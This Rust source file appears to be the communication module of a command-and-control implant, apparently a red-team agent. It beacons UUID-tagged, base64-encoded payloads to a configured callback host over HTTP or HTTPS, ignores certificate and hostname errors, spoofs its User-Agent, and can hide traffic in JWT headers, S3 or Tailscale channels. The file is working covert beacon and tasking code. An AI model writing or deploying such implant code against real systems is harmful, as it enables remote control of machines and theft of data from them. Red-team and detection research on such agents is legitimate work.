use reqwest::blocking::Client;
use std::time::Duration;
use serde_json::Value;
use base64::{engine::general_purpose, Engine as _};
use hmac::{Hmac, Mac};
use sha2::Sha256;
use crate::config;
use crate::s3_transport;
#[cfg(feature = "tailscale")]
use crate::tailscale_transport;

type HmacSha256 = Hmac<Sha256>;


pub fn send_request(payload: &str) -> Result<String, Box<dyn std::error::Error>> {
    #[cfg(feature = "tailscale")]
    if config::use_tailscale {
        return tailscale_transport::send_request(payload);
    }
    if config::use_jwt_bearer {
        return send_request_jwt(payload, true);
    }
    if config::use_s3 {
        s3_transport::send_and_receive(payload)
    } else {
        send_request_internal(payload, true)
    }
}

pub fn send_request_raw(payload: &str) -> Result<String, Box<dyn std::error::Error>> {
    #[cfg(feature = "tailscale")]
    if config::use_tailscale {
        return tailscale_transport::send_request_raw(payload);
    }
    if config::use_jwt_bearer {
        return send_request_jwt(payload, false);
    }
    if config::use_s3 {
        s3_transport::send_and_receive(payload)
    } else {
        send_request_internal(payload, false)
    }
}

fn base64url_encode(data: &[u8]) -> String {
    general_purpose::URL_SAFE_NO_PAD.encode(data)
}

fn base64url_decode(data: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    Ok(general_purpose::URL_SAFE_NO_PAD.decode(data)?)
}

fn jwt_encode(payload_b64: &str, secret: &str) -> String {
    let header = base64url_encode(b"{\"alg\":\"HS256\",\"typ\":\"JWT\"}");
    let claims = format!("{{\"payload\":\"{}\"}}", payload_b64);
    let claims_b64 = base64url_encode(claims.as_bytes());
    let signing_input = format!("{}.{}", header, claims_b64);

    let mut mac = HmacSha256::new_from_slice(secret.as_bytes()).unwrap();
    mac.update(signing_input.as_bytes());
    let signature = base64url_encode(&mac.finalize().into_bytes());

    format!("{}.{}", signing_input, signature)
}

fn jwt_decode(token: &str, secret: &str) -> Result<String, Box<dyn std::error::Error>> {
    let parts: Vec<&str> = token.splitn(3, '.').collect();
    if parts.len() != 3 {
        return Err("invalid JWT: expected 3 parts".into());
    }

    let signing_input = format!("{}.{}", parts[0], parts[1]);
    let mut mac = HmacSha256::new_from_slice(secret.as_bytes()).unwrap();
    mac.update(signing_input.as_bytes());
    let sig_bytes = base64url_decode(parts[2])?;
    mac.verify_slice(&sig_bytes).map_err(|_| -> Box<dyn std::error::Error> { "JWT signature verification failed".into() })?;

    let claims_json = base64url_decode(parts[1])?;
    let claims: Value = serde_json::from_slice(&claims_json)?;
    claims["payload"]
        .as_str()
        .map(|s| s.to_string())
        .ok_or_else(|| -> Box<dyn std::error::Error> { "JWT missing payload claim".into() })
}

fn send_request_jwt(payload: &str, encode: bool) -> Result<String, Box<dyn std::error::Error>> {
    let encoded = if encode {
        let uuid = config::UUID.read().unwrap();
        let full_msg = format!("{}{}", *uuid, payload);
        general_purpose::STANDARD.encode(full_msg)
    } else {
        payload.to_string()
    };

    let jwt_token = jwt_encode(&encoded, config::jwt_secret);

    let url = format!(
        "{}://{}:{}/{}",
        if config::use_ssl { "https" } else { "http" },
        config::callback_host,
        config::callback_port,
        config::post_uri
    );
    crate::dlog!("jwt: POST {url} jwt_len={}", jwt_token.len());

    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .danger_accept_invalid_hostnames(true)
        .build()?;
    let res = client
        .post(&url)
        .header("Authorization", format!("Bearer {}", jwt_token))
        .header("User-Agent", config::user_agent)
        .timeout(Duration::from_secs(10))
        .send()
        .map_err(|e| {
            crate::dlog!("jwt: send err: {e}");
            e
        })?;

    let status = res.status();
    let auth_resp = res.headers()
        .get("Authorization")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("")
        .to_string();
    crate::dlog!("jwt: status={status} auth_hdr_len={}", auth_resp.len());

    let jwt_resp = if auth_resp.starts_with("Bearer ") {
        &auth_resp[7..]
    } else {
        &auth_resp
    };

    if jwt_resp.is_empty() {
        return Err("jwt: empty Authorization response header".into());
    }

    let decoded = jwt_decode(jwt_resp, config::jwt_secret)?;
    crate::dlog!("jwt: decoded resp_len={}", decoded.len());
    Ok(decoded)
}

fn send_request_internal(payload: &str, encode: bool) -> Result<String, Box<dyn std::error::Error>> {
    let encoded = if encode {
        let uuid = config::UUID.read().unwrap();
        let full_msg = format!("{}{}", *uuid, payload);
        general_purpose::STANDARD.encode(full_msg)
    } else {
        payload.to_string()
    };

    let url = format!(
        "{}://{}:{}/{}",
        if config::use_ssl { "https" } else { "http" },
        config::callback_host,
        config::callback_port,
        config::post_uri
    );
    crate::dlog!("http: POST {url} body_len={}", encoded.len());

    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .danger_accept_invalid_hostnames(true)
        .build()?;
    let res = client
        .post(&url)
        .header("Content-Type", "text/plain")
        .header("User-Agent", config::user_agent)
        .timeout(Duration::from_secs(10))
        .body(encoded)
        .send()
        .map_err(|e| {
            crate::dlog!("http: send err: {e}");
            e
        })?;

    let status = res.status();
    let body = res.text().map_err(|e| {
        crate::dlog!("http: body err: {e}");
        e
    })?;
    crate::dlog!("http: status={status} resp_len={}", body.len());
    Ok(body)
}

pub fn send_request_with_response(payload: &str) -> Result<Value, Box<dyn std::error::Error>> {
    #[cfg(feature = "tailscale")]
    if config::use_tailscale {
        return tailscale_transport::send_request_with_response(payload);
    }
    if config::use_jwt_bearer {
        let response_text = send_request_jwt(payload, true)?;
        let json: Value = serde_json::from_str(&response_text)?;
        return Ok(json);
    }
    if config::use_s3 {
        s3_transport::send_and_receive_json(payload)
    } else {
        let response_text = send_request_internal(payload, true)?;
        let json: Value = serde_json::from_str(&response_text)?;
        Ok(json)
    }
}

#[allow(dead_code)]
pub fn send_request_with_response_raw(payload: &str) -> Result<Value, Box<dyn std::error::Error>> {
    #[cfg(feature = "tailscale")]
    if config::use_tailscale {
        return tailscale_transport::send_request_with_response_raw(payload);
    }
    if config::use_jwt_bearer {
        let response_text = send_request_jwt(payload, false)?;
        let json: Value = serde_json::from_str(&response_text)?;
        return Ok(json);
    }
    if config::use_s3 {
        s3_transport::send_and_receive_json(payload)
    } else {
        let response_text = send_request_internal(payload, false)?;
        let json: Value = serde_json::from_str(&response_text)?;
        Ok(json)
    }
}
